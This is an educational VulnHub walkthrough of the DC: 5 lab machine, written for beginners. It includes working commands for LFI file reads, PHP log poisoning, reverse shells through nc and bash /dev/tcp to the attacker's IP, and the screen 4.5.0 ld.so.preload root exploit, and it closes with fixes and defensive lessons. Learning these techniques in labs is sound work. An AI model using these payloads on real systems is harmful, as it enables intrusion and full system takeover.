# DC: 5 — VulnHub Walkthrough (Beginner to Intermediate)

DC: 5 is the fifth machine in the DCAU "DC" series. It is a deliberately broken
Debian web server. DC: 5 "kicks it up a notch" from DC: 4: instead of a simple login
brute-force, you must find a **Local File Inclusion (LFI)** bug, turn it into remote
code execution through **log poisoning**, and then escalate to root with a vulnerable
**SUID `screen`** binary. This document explains every step as if you are new to hacking.

| Field | Value |
|---|---|
| Machine | DC: 5 |
| Difficulty | Beginner / Intermediate |
| Author | DCAU (http://www.five86.com/dc-5.html) |
| Released | 21 April 2019 |
| VulnHub Entry | https://vulnhub.com/entry/dc-5,314/ |
| Download | https://vulnhub.com/entry/dc-5,314/#download |
| Attacker | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| Target OS | Debian Linux 64-bit (VirtualBox) |

> **Legal note:** Only attack a machine you own or have explicit permission to test.
> This VM is designed to be broken — never point these tools at systems you do not own.

## 0. What you will learn

By the end of this lab you will have practised:

- **Host discovery** — finding the target with `nmap` ping sweeps.
- **Web enumeration** — identifying nginx and mapping the site.
- **Local File Inclusion (LFI)** — tricking a web page into reading files it should not.
- **Log poisoning** — injecting PHP code into a log file, then executing it via LFI.
- **Reverse shells** — turning command execution into an interactive shell.
- **SUID enumeration** — finding root-owned binaries that run as root.
- **Public exploit adaptation** — using Exploit-DB and compiling exploit source yourself.
- **Blue-team thinking** — why each mistake is dangerous and how to prevent it.

The core idea: a small "read a file" bug becomes full remote code execution when a log
file containing your input is executed as a script. Then a single outdated binary gives
you root.

## 1. Reconnaissance — finding the target

Confirm your attacker IP is `192.168.56.10`.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Sweep the subnet for live hosts with `nmap`. The `-sn` flag means "ping scan" — it finds
hosts without scanning ports, which is fast.


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -sn 192.168.56.0/24
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
```

The target is `192.168.56.101`.

![Ping sweep finding the target host](images/01-nmap-sweep.png)

> **Why it works:** `-sn` sends ARP/ICMP probes and reports which addresses answer. It is
> the quickest way to discover a machine whose IP you do not know yet.


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

Now identify the open ports and the software behind them.

```bash
nmap -sC -sV -p- 192.168.56.101 -oN nmap-full.txt
```

```text
PORT    STATE SERVICE VERSION
80/tcp  open  http    nginx 1.17.6
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OS: Linux
```

Port 80 is a web server; port 111 is RPC (not useful here). (Version numbers vary by build.)

![Full nmap scan showing nginx on port 80](images/02-nmap.png)

Visit the site — a browser or `curl` both work.

```bash
curl -s http://192.168.56.101/ | grep -iE "title|copyright"
```

```text
<title>DC-5</title>
Copyright © 2019
```

The site has several pages (Home, About, Contact, Thank You). There is **no login page
this time** — a key difference from earlier DC boxes. Enumerate directories and files.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php
```

```text
/index.php            (Status: 200)
/contact.php          (Status: 200)
/thankyou.php         (Status: 200)
/footer.php           (Status: 200)
```

![Browsing the DC-5 web site](images/03-site.png)

### 2.1 Spotting the LFI

Submit the contact form. You land on a page whose URL looks like this:

```text
http://192.168.56.101/thankyou.php?firstname=test&lastname=test&country=australia&subject=test
```

One parameter — `country` (or `file` in some builds) — is used to load a footer file on
the server. Watch the copyright year change on every refresh: that year is being read
from a file. Try swapping the filename for a system file:


> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```bash
curl -s "http://192.168.56.101/thankyou.php?file=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

That is the system's user list! The page is reading whatever file you name.

![Reading /etc/passwd through the LFI](images/04-lfi-passwd.png)

> **Why it works:** The PHP code behind the page does something like
> `include($_GET['file'])` without checking the path. PHP happily reads and includes any
> file the web user can access, including `/etc/passwd`. This is Local File Inclusion.
> Different builds expose the parameter as `country` or `file` — if one does not work,
> try the other.

## 3. Foothold

LFI lets us read files, but we want to *run* code. The trick is **log poisoning**.

### 3.1 Confirm we can read the web log

nginx records every request in a log file. Ask the LFI to read it.

```bash
curl -s "http://192.168.56.101/thankyou.php?file=/var/log/nginx/access.log" | tail -5
```

```text
192.168.56.10 - - [14/Oct/2026:10:22:01 +0000] "GET /thankyou.php?file=/etc/passwd HTTP/1.1" 200 ...
```

We can read the log, and — crucially — **our requests appear inside it**.

![Access log contents retrieved via LFI](images/05-access-log.png)

### 3.2 Poison the log with PHP

Send a request whose User-Agent (or URL) contains a PHP snippet. nginx writes the raw
request — including our code — into `access.log`.

```bash
curl -s -A "<?php system(\$_GET['cmd']); ?>" http://192.168.56.101/
```

```text
(server responds normally; the payload is now stored in access.log)
```

Now include the log file through the LFI, and add a `cmd` parameter to run a command.

```bash
curl -s "http://192.168.56.101/thankyou.php?file=/var/log/nginx/access.log&cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have command execution as `www-data`.

> **Why it works:** LFI `include()` executes PHP found inside the included file. The log
> file is not normally PHP, but we planted PHP inside it via our User-Agent string.
> When PHP includes the poisoned log, it runs our `system()` call. This is "log poisoning."

### 3.3 Get an interactive reverse shell

Start a listener on Kali.


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
rlwrap nc -lvnp 1234
```

Ask the target to connect back. URL-encode the space in the command (`nc%20...`) so the
web server passes it through cleanly.

```bash
curl -s "http://192.168.56.101/thankyou.php?file=/var/log/nginx/access.log&cmd=nc%20192.168.56.10%201234%20-e%20/bin/sh"
```

```text
listening on [any] 1234 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 45982
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade the shell to a full TTY so arrow keys and `Ctrl-C` behave:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![Reverse shell as www-data](images/06-reverse-shell.png)

> **Why it works:** `nc -e /bin/sh` tells the target to attach a shell to the outbound
> connection. Because the target initiated the connection, most simple firewalls let it
> through — that is the whole point of a *reverse* shell.


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Find SUID binaries

SUID (Set Owner User ID) files run with the privileges of their owner. If the owner is
root, the program runs as root.


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/bin/sudo
/usr/bin/passwd
/bin/su
/bin/screen-4.5.0
/usr/bin/mount
...
```

`/bin/screen-4.5.0` stands out. The version string is the giveaway.

![SUID scan highlighting /bin/screen-4.5.0](images/07-suid.png)

### 4.2 Exploit screen 4.5.0

GNU `screen` 4.5.0 has a known local privilege-escalation bug (**CVE-2017-5618**).
Exploit-DB entries **41154** and **41152** demonstrate it. The 41154 script builds a
shared library and a helper that uses screen's logfile feature to write to a root
directory, then loads the library with elevated privileges.

Copy the exploit from SearchSploit inside the shell or download it on Kali, then host it:


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
# on Kali: fetch the exploit
searchsploit -m linux/local/41154.sh
# start a simple web server in the folder holding the exploit
python3 -m http.server 4567
```

On the target, download it into `/tmp`:

```bash
cd /tmp
wget http://192.168.56.10:4567/41154.sh
chmod +x 41154.sh
```

The one-shot script sometimes fails, so a reliable approach is to build its two C files
by hand. Extract `libhax.c` and `rootshell.c` from the script and compile them:

```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c
```

Then run the three-part steps (from the exploit's own script):

```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

You are root.

> **Why it works:** screen 4.5.0 lets a low-privileged user write to `/etc/ld.so.preload`
> through its logging feature. Anything listed there is loaded by every future program,
> including root programs. Our `libhax.so` turns on a setuid flag so `rootshell` runs as
> root. Classic SUID-plus-outdated-software escalation.

### 4.3 Read the flag

```bash
cd /root
ls
cat thisistheflag.txt
```

```text
You made it. Flag: ...
```

(Confirm the exact flag filename on your build — older builds use `/root/thisistheflag.txt`.)

![Root shell and flag](images/08-root-flag.png)

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
|---|---|---|---|---|
| 1 | Local File Inclusion | `thankyou.php?file=` parameter | Read any file the web user can read | Validate/allow-list includes; disable `allow_url_include`; use fixed paths |
| 2 | Log poisoning → RCE | nginx `access.log` + LFI | Remote code execution as `www-data` | Never log raw user input into an executed path; sanitise/disable includes of logs |
| 3 | SUID vulnerable binary | `/bin/screen-4.5.0` (CVE-2017-5618) | Local privilege escalation to root | Patch/replace old `screen`; minimise SUID binaries |
| 4 | World-writable sensitive file path | screen writes `/etc/ld.so.preload` | Persistent root load of attacker library | Correct file permissions; monitor `ld.so.preload` |
| 5 | Weak file permissions in web root | LFI can reach system files | Information disclosure (users, configs) | Harden web user's file access; chroot/jail the app |

## 6. Defensive lessons (blue team)

- **Never include a file based on user input.** Map friendly names to fixed paths and
  reject anything else. This single rule kills LFI.
- **Treat logs as untrusted data.** Logs contain whatever an attacker sends. They must
  never be executed or included by a scripting engine.
- **Patch and inventory SUID binaries.** Run `find / -perm -u=s -type f` yourself. Any
  root-owned SUID program is a potential escalation. Remove the ones you do not need.
- **Watch `/etc/ld.so.preload`.** It should almost always be empty or absent. A new entry
  is a strong compromise indicator.
- **Run the web app with least privilege** in a sandbox, so reading `/etc/passwd` and
  writing to system paths is impossible.
- **Egress filtering.** The reverse shell is an outbound connection from the server to
  your host; block unexpected outbound traffic.

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry — https://vulnhub.com/entry/dc-5,314/
- DCAU series home — http://www.five86.com/dc-5.html
- Exploit-DB 41154 (screen 4.5.0) — https://www.exploit-db.com/exploits/41154
- Exploit-DB 41152 (screen 4.5.0) — https://www.exploit-db.com/exploits/41152
- CVE-2017-5618 (screen LPE) — https://nvd.nist.gov/vuln/detail/CVE-2017-5618
- GTFOBins (SUID/sudo abuse) — https://gtfobins.github.io/
- OWASP Local File Inclusion — https://owasp.org/www-community/vulnerabilities/File_Include
- bzyo DC-5 walkthrough — https://bzyo.github.io/dc-5/

## 8. Screenshot checklist

Capture these as you go so your write-up is verifiable:

- [ ] `images/01-nmap-sweep.png` — ping sweep finding `192.168.56.101`
- [ ] `images/02-nmap.png` — full nmap scan showing nginx on port 80
- [ ] `images/03-site.png` — the DC-5 web site
- [ ] `images/04-lfi-passwd.png` — `/etc/passwd` read via the LFI
- [ ] `images/05-access-log.png` — nginx access log retrieved via LFI
- [ ] `images/06-reverse-shell.png` — `www-data` reverse shell
- [ ] `images/07-suid.png` — SUID scan showing `/bin/screen-4.5.0`
- [ ] `images/08-root-flag.png` — root shell and flag contents
